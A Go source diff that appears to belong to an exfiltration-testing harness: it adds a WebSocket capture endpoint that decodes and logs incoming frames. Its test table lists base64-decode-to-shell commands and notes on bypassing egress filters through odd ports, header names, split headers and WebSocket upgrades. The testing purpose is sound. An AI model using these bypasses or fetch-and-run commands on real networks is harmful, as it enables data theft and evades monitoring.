@@ -4,11 +4,14 @@
 package main
 
 import (
+	"bufio"
 	"compress/gzip"
 	crand "crypto/rand"
+	"crypto/sha1" //nolint:gosec // required by RFC 6455 WebSocket handshake
 	"crypto/tls"
 	"database/sql"
 	"encoding/base64"
+	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -128,6 +131,7 @@ var payloadSpecs = []payloadSpec{
 	{28, "/cdn/assets/fonts", "/c/28", "b64_json_d", "json", "jq -r .d|base64 -d|sh", "https port 9443", "protocol", "multiple", "non-standard TLS port bypasses iptables redirect"},
 	{29, "/api/v1/analytics", "/c/29", "header_name_b64", "json", "jq -r .d|base64 -d|sh", "header name exfil", "encoding", "multiple", "Go header canonicalization lowercases credential patterns"},
 	{30, "/health/telemetry", "/c/30", "multi_value_header", "json", "jq -r .d|base64 -d|sh", "split multi-value header", "protocol", "multiple", "credential split across repeated header values"},
+	{31, "/api/v1/stream", "/ws/31", "ws_frame", "json", "jq -r .d|base64 -d|sh", "websocket exfil", "protocol", "multiple", "websocket upgrade bypasses http-only inspection"},
 }
 
 func main() {
@@ -146,6 +150,9 @@ func main() {
 
 	// Per-test capture endpoints: /c/{id} — one per payloadSpec entry
 	mux.HandleFunc("/c/", captureRouter)
+
+	// WebSocket capture endpoints: /ws/{id} — accepts WS upgrade, reads frames
+	mux.HandleFunc("/ws/", wsRouter)
 
 	// Payload download endpoints — each spec gets its own benign path
 	payloadsDir := getEnv("PAYLOADS_DIR", "/payloads")
@@ -269,7 +276,7 @@ func main() {
 func captureRouter(w http.ResponseWriter, r *http.Request) {
 	idStr := strings.TrimPrefix(r.URL.Path, "/c/")
 	testID, err := strconv.Atoi(idStr)
-	if err != nil || testID < 1 || testID > len(payloadSpecs) {
+	if err != nil || testID < 1 || testID > len(payloadSpecs) || payloadSpecs[testID-1].Decode == "ws_frame" {
 		http.NotFound(w, r)
 		return
 	}
@@ -753,6 +760,199 @@ func startICMPListener() {
 		log.Printf(">>> ICMP from %s (%d bytes payload)", addr, len(data))
 		insertCapture(22, "icmp", 0, fmt.Sprintf("icmp from %s", addr), string(data))
 	}
+}
+
+// ---------------------------------------------------------------
+// WebSocket listener — test 31
+// ---------------------------------------------------------------
+
+// wsRouter handles WebSocket upgrade requests on /ws/{testID}.
+// Implements RFC 6455 handshake and frame reading with no external dependencies.
+func wsRouter(w http.ResponseWriter, r *http.Request) {
+	idStr := strings.TrimPrefix(r.URL.Path, "/ws/")
+	testID, err := strconv.Atoi(idStr)
+	if err != nil || testID < 1 || testID > len(payloadSpecs) {
+		http.NotFound(w, r)
+		return
+	}
+
+	// Verify this is a WebSocket upgrade request.
+	if !strings.EqualFold(r.Header.Get("Upgrade"), "websocket") ||
+		!headerContains(r.Header, "Connection", "upgrade") {
+		http.Error(w, "expected websocket upgrade", http.StatusBadRequest)
+		return
+	}
+
+	key := r.Header.Get("Sec-WebSocket-Key")
+	if key == "" {
+		http.Error(w, "missing Sec-WebSocket-Key", http.StatusBadRequest)
+		return
+	}
+
+	// Hijack the connection for raw TCP access.
+	hj, ok := w.(http.Hijacker)
+	if !ok {
+		http.Error(w, "server does not support hijacking", http.StatusInternalServerError)
+		return
+	}
+	conn, bufrw, err := hj.Hijack()
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	defer conn.Close()
+
+	// Complete the WebSocket handshake (RFC 6455 §4.2.2).
+	accept := wsAcceptKey(key)
+	bufrw.WriteString("HTTP/1.1 101 Switching Protocols\r\n")
+	bufrw.WriteString("Upgrade: websocket\r\n")
+	bufrw.WriteString("Connection: Upgrade\r\n")
+	bufrw.WriteString("Sec-WebSocket-Accept: " + accept + "\r\n")
+	bufrw.WriteString("\r\n")
+	bufrw.Flush()
+
+	log.Printf(">>> WebSocket upgraded for test=%d from %s", testID, r.RemoteAddr)
+
+	// Read frames until close or error.
+	for {
+		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
+		payload, opcode, err := wsReadFrame(bufrw.Reader)
+		if err != nil {
+			log.Printf("WebSocket read error (test=%d): %v", testID, err)
+			break
+		}
+
+		// Opcode 8 = close frame.
+		if opcode == 8 {
+			// Send close frame back.
+			wsWriteClose(conn)
+			break
+		}
+
+		// Opcode 9 = ping — reply with pong.
+		if opcode == 9 {
+			wsWritePong(conn, payload)
+			continue
+		}
+
+		// Opcode 1 (text) or 2 (binary) — capture it.
+		if opcode == 1 || opcode == 2 {
+			data := string(payload)
+
+			// Try base64 decode for binary-wrapped exfil.
+			if decoded, err := base64.StdEncoding.DecodeString(data); err == nil && len(decoded) > 0 {
+				data = string(decoded)
+			}
+
+			proto := "websocket"
+			transport := fmt.Sprintf("ws frame opcode=%d from %s", opcode, r.RemoteAddr)
+			insertCapture(testID, proto, 443, transport, data)
+		}
+	}
+}
+
+// wsAcceptKey computes the Sec-WebSocket-Accept value per RFC 6455 §4.2.2.
+func wsAcceptKey(key string) string {
+	const magic = "258EAFA5-E914-47DA-95CA-5AB5DC76B98B"
+	h := sha1.New() //nolint:gosec // nosemgrep: go.lang.security.audit.crypto.use_of_weak_crypto.use-of-sha1 -- required by RFC 6455 WebSocket handshake
+	h.Write([]byte(key + magic))
+	return base64.StdEncoding.EncodeToString(h.Sum(nil))
+}
+
+// wsReadFrame reads a single WebSocket frame (RFC 6455 §5.2).
+// Returns the unmasked payload, opcode, and any error.
+func wsReadFrame(r *bufio.Reader) ([]byte, byte, error) {
+	// First 2 bytes: FIN/opcode + mask/payload length.
+	header := make([]byte, 2)
+	if _, err := io.ReadFull(r, header); err != nil {
+		return nil, 0, fmt.Errorf("read header: %w", err)
+	}
+
+	opcode := header[0] & 0x0F
+	masked := header[1]&0x80 != 0
+	length := uint64(header[1] & 0x7F)
+
+	// Extended payload length.
+	switch length {
+	case 126:
+		ext := make([]byte, 2)
+		if _, err := io.ReadFull(r, ext); err != nil {
+			return nil, 0, fmt.Errorf("read ext16: %w", err)
+		}
+		length = uint64(binary.BigEndian.Uint16(ext))
+	case 127:
+		ext := make([]byte, 8)
+		if _, err := io.ReadFull(r, ext); err != nil {
+			return nil, 0, fmt.Errorf("read ext64: %w", err)
+		}
+		length = binary.BigEndian.Uint64(ext)
+	}
+
+	// Cap frame size to prevent memory exhaustion.
+	const maxFrameSize = 10 * 1024 * 1024 // 10 MB
+	if length > maxFrameSize {
+		return nil, 0, fmt.Errorf("frame too large: %d bytes", length)
+	}
+
+	// Masking key (4 bytes, present if masked).
+	var mask [4]byte
+	if masked {
+		if _, err := io.ReadFull(r, mask[:]); err != nil {
+			return nil, 0, fmt.Errorf("read mask: %w", err)
+		}
+	}
+
+	// Payload.
+	payload := make([]byte, length)
+	if _, err := io.ReadFull(r, payload); err != nil {
+		return nil, 0, fmt.Errorf("read payload: %w", err)
+	}
+
+	// Unmask.
+	if masked {
+		for i := range payload {
+			payload[i] ^= mask[i%4]
+		}
+	}
+
+	return payload, opcode, nil
+}
+
+// wsWriteClose sends a close frame (opcode 8) to the peer.
+func wsWriteClose(conn net.Conn) {
+	frame := []byte{0x88, 0x00} // FIN + close opcode, 0 length
+	conn.Write(frame)
+}
+
+// wsWritePong sends a pong frame (opcode 10) echoing the ping payload.
+func wsWritePong(conn net.Conn, payload []byte) {
+	n := len(payload)
+	var frame []byte
+	if n < 126 {
+		frame = make([]byte, 2+n)
+		frame[0] = 0x8A // FIN + pong opcode
+		frame[1] = byte(n)
+		copy(frame[2:], payload)
+	} else {
+		frame = make([]byte, 4+n)
+		frame[0] = 0x8A
+		frame[1] = 126
+		binary.BigEndian.PutUint16(frame[2:4], uint16(n))
+		copy(frame[4:], payload)
+	}
+	conn.Write(frame)
+}
+
+// headerContains checks if a comma-separated HTTP header contains a value (case-insensitive).
+func headerContains(h http.Header, key, value string) bool {
+	for _, v := range h[http.CanonicalHeaderKey(key)] {
+		for part := range strings.SplitSeq(v, ",") {
+			if strings.EqualFold(strings.TrimSpace(part), value) {
+				return true
+			}
+		}
+	}
+	return false
 }
 
 // ---------------------------------------------------------------
